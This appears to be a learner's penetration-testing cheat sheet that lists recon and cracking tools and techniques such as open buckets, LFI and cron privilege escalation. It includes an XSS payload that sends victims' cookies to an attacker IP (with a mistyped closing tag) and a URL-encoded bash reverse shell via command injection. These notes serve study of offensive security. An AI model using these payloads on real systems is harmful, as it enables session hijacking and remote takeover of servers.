# Notes

Tools:
- nmap | $ nmap | Portscan
- john_the_ripper | $ john | PW & Hash Brute-forecing
- dirbuster | $ dirb | dir enumeration
- sherlock | $ python3 sherlock (use whole folder) | OSINT Profile detection by Username
- metasploit | $ msfconsole | Bunch of exploits
- steghide | $ steghide | steganography tool
- ncat | $ncat | use to listen on ports (for example to wait for XSS posts to your ip adress)


Technologies:
- AWS | Amazon Web Services; insecure cloud storage... Use a bucket-name to access on bucketname.amazonaws.com
- FTP | File Transfer Protocol | if configured you can access public files with user "annonymous" pw "guest"
- LFI | Local File Inclusion | Use functions or parameters to access server files; https://www.1337pwn.com/how-to-hack-a-website-using-local-file-inclusion-lfi/ 
- XSS | Cross-Site-Scription | i.e. unsanetiezed User Input (<script> new Image().src = "http://[ip_adress]:1234/cookie.php=cookie="+document.cookie;</cookie> -> then listen to port 1234 to retrieve other users cookie)
- Command Injection |  some sites allow you to run Shell-Commdans through URLs (http://10.10.66.101:3000/api/cmd/bash%20-i%20%3E&%20%2Fdev%2Ftcp%2F10.8.120.66%2F8000%200%3E&1); you can sometimes create reverse Shells with that
- reverse Shell | with Bash: https://hackernoon.com/reverse-shell-cf154dfee6bd 
- Cron Jobs | with crontab you can check jobs running on the System in certain intervalls; /etc/crontab has scheduels for hourly/daily/weekly/monthly; /var/spool/cron has info about jobs per user, requieres permission; Can potentially be used to escalate privelages if scrips are found that are run in Cron-Jobs... By changeing the scripts you can run commands with that user
